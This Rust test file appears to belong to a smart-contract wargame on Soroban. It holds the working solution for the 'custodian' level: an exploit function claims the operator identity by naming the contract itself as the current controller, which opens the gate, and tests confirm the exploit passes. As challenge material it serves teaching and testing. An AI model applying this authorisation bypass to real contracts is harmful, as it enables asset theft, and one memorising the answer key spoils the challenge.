use crate::harness::{auth, contract_error, errors, LevelSpec, Scenario};
use soroban_sdk::{contractclient, Address, Env, IntoVal};

pub const SPEC: LevelSpec = LevelSpec {
    id: 5,
    slug: "custodian",
    interface: &[
        "__constructor",
        "caller",
        "claim_identity",
        "controller",
        "current_controller",
        "enter",
        "gate_open",
        "identity",
        "new_controller",
        "operator_identity",
        "player",
    ],
};

#[allow(dead_code)]
#[contractclient(name = "CustodianClient")]
pub trait CustodianInterface {
    fn operator_identity(env: Env) -> u32;
    fn controller(env: Env, identity: u32) -> Address;
    fn claim_identity(
        env: Env,
        identity: u32,
        current_controller: Address,
        new_controller: Address,
    );
    fn enter(env: Env, identity: u32, caller: Address);
    fn gate_open(env: Env, caller: Address) -> bool;
}

fn claim(c: &Scenario, instance: &Address, identity: u32, current: &Address, next: &Address) {
    CustodianClient::new(&c.env, instance)
        .mock_auths(&[auth(
            next,
            instance,
            "claim_identity",
            (identity, current.clone(), next.clone()).into_val(&c.env),
        )])
        .claim_identity(&identity, current, next);
}

fn enter(c: &Scenario, instance: &Address, identity: u32, caller: &Address) {
    CustodianClient::new(&c.env, instance)
        .mock_auths(&[auth(
            caller,
            instance,
            "enter",
            (identity, caller.clone()).into_val(&c.env),
        )])
        .enter(&identity, caller);
}

pub(crate) fn exploit(c: &Scenario, instance: &Address, player: &Address) {
    let identity = CustodianClient::new(&c.env, instance).operator_identity();
    claim(c, instance, identity, instance, player);
    enter(c, instance, identity, player);
}

#[test]
fn the_objective_is_not_met_at_the_start() {
    let c = Scenario::new();
    let custodian = c.create_instance(&c.player, SPEC.id);
    let client = CustodianClient::new(&c.env, &custodian);

    let identity = client.operator_identity();
    assert_eq!(
        client.controller(&identity),
        custodian,
        "the operator identity starts with the sealed system"
    );
    assert!(!client.gate_open(&c.player), "the gate starts closed");

    assert_eq!(
        c.submit(&c.player, &custodian),
        Err(contract_error(errors::OBJECTIVE_NOT_MET)),
        "an untouched Custodian must not pass"
    );
}

#[test]
fn the_exploit_makes_the_custodian_believe_in_the_player() {
    let c = Scenario::new();
    let custodian = c.create_instance(&c.player, SPEC.id);

    exploit(&c, &custodian, &c.player);

    let client = CustodianClient::new(&c.env, &custodian);
    let identity = client.operator_identity();
    assert_eq!(client.controller(&identity), c.player);
    assert!(client.gate_open(&c.player));

    assert_eq!(c.submit(&c.player, &custodian), Ok(()));
    assert!(c.is_completed(&c.player, SPEC.id));
}

#[test]
fn the_identity_cannot_be_claimed_with_a_wrong_current_controller() {
    let c = Scenario::new();
    let custodian = c.create_instance(&c.player, SPEC.id);
    let client = CustodianClient::new(&c.env, &custodian);
    let identity = client.operator_identity();

    let result = client
        .mock_auths(&[auth(
            &c.player,
            &custodian,
            "claim_identity",
            (identity, c.other.clone(), c.player.clone()).into_val(&c.env),
        )])
        .try_claim_identity(&identity, &c.other, &c.player);
    assert!(
        result.is_err(),
        "the stored controller is the Custodian, not an arbitrary address"
    );
    assert_eq!(client.controller(&identity), custodian);
}

#[test]
fn the_gate_only_opens_for_the_controller() {
    let c = Scenario::new();
    let custodian = c.create_instance(&c.player, SPEC.id);
    let client = CustodianClient::new(&c.env, &custodian);
    let identity = client.operator_identity();

    claim(&c, &custodian, identity, &custodian, &c.player);

    let result = client
        .mock_auths(&[auth(
            &c.other,
            &custodian,
            "enter",
            (identity, c.other.clone()).into_val(&c.env),
        )])
        .try_enter(&identity, &c.other);
    assert!(
        result.is_err(),
        "a correct Core Gate refuses a caller that does not control the identity"
    );
    assert!(!client.gate_open(&c.other));
}

#[test]
fn submitting_twice_is_refused() {
    let c = Scenario::new();
    let custodian = c.create_instance(&c.player, SPEC.id);
    exploit(&c, &custodian, &c.player);

    assert_eq!(c.submit(&c.player, &custodian), Ok(()));
    assert_eq!(
        c.submit(&c.player, &custodian),
        Err(contract_error(errors::ALREADY_COMPLETED))
    );
}

#[test]
fn an_instance_the_core_did_not_create_is_refused() {
    let c = Scenario::new();
    let foreign = crate::harness::register(&c.env, &SPEC.instance_wasm(), (c.player.clone(),));

    exploit(&c, &foreign, &c.player);
    assert!(CustodianClient::new(&c.env, &foreign).gate_open(&c.player));

    assert_eq!(
        c.submit(&c.player, &foreign),
        Err(contract_error(errors::UNKNOWN_INSTANCE))
    );
}
